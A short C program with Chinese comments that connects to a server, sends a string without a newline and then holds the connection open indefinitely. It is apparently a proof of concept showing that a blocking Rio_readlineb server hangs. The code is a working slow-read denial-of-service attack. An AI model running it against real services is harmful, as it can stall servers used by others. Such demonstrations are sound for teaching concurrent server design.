#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int argc, char **argv) {
    if (argc != 3) {
        fprintf(stderr, "用法: %s <IP地址> <端口>\n", argv[0]);
        exit(0);
    }

    int clientfd;
    struct sockaddr_in serveraddr;

    clientfd = socket(AF_INET, SOCK_STREAM, 0);

    bzero(&serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    serveraddr.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &serveraddr.sin_addr);

    if (connect(clientfd, (struct sockaddr *)&serveraddr, sizeof(serveraddr)) < 0) {
        perror("连接失败");
        exit(1);
    }

    // 攻击核心：发送不带 \n 的数据
    // 你的服务器 Rio_readlineb 会一直等这个 \n，直到天荒地老
    char *msg = "I am a bad guy. I won't send a newline.";
    write(clientfd, msg, strlen(msg));
    printf("已发送部分数据（无换行符）。服务器现在应该卡死在 Rio_readlineb 了...\n");

    // 挂起进程，不关闭连接，也不继续发数据
    while (1) {
        sleep(10); 
    }

    close(clientfd);
    return 0;
}
